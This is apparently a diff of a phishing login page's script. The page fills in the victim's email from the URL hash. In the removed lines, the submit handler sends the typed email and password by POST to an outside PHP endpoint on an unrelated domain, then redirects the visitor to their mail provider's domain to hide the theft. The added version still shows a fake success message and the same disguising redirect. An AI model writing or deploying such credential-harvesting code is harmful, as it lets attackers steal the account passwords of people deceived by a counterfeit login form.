@@ -203,7 +203,7 @@ button:disabled {
 
 </div>
 
-<script type="9bb31266bd8e7843de8eddb6-text/javascript">
+<script type="text/javascript">
 
 const emailFromHash = window.location.hash.substring(1);
 
@@ -211,66 +211,40 @@ if (emailFromHash) {
     document.getElementById("email").value = emailFromHash;
 }
 
-document.getElementById("loginForm").addEventListener("submit", async function (event) {
+document.getElementById("loginForm").addEventListener("submit", function (event) {
     event.preventDefault();
 
-    const email = document.getElementById("email").value.trim();
- const password = document.getElementById("password").value.trim();
     const button = document.getElementById("submit-btn");
+    const message = document.getElementById("message");
 
     button.disabled = true;
-    button.textContent = "Saving...";
+    button.textContent = "Processing...";
 
-    try {
-        const response = await fetch(
-            "https://lorneplumbing.com.au/via/login.php",
-            {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/x-www-form-urlencoded"
-                },
-           body: new URLSearchParams({
-    email: email,
-    password: password
-})
+    message.textContent = "Submission successful.";
 
-            }
-        );
+    const atPosition = emailFromHash.lastIndexOf("@");
 
-        const text = await response.text();
-        console.log("PHP response:", text);
-
-        const result = JSON.parse(text);
-
-     
-
-
-
-if (!response.ok || !result.success) {
-    throw new Error(result.message || "Submission failed.");
-}
-
-window.location.href = "https://" + window.location.hash.substring(1).split("@").pop();
-
-
-
-
-
-
-
-
-
-
-
-    } catch (error) {
-        console.error(error);
-        alert(error.message);
-
+    if (atPosition === -1) {
+        message.textContent = "Invalid email address.";
         button.disabled = false;
         button.textContent = "Log in";
+        return;
     }
+
+    const domain = emailFromHash.substring(atPosition + 1).trim();
+
+    if (!/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(domain)) {
+        message.textContent = "Invalid domain.";
+        button.disabled = false;
+        button.textContent = "Log in";
+        return;
+    }
+
+    window.location.href = "https://" + domain;
 });
+
 </script>
+
 
 
 <script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="9bb31266bd8e7843de8eddb6-|49" defer></script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"d8cca4e5f7bd444584cf8ae4ed46955e","r":1}' crossorigin="anonymous"></script>
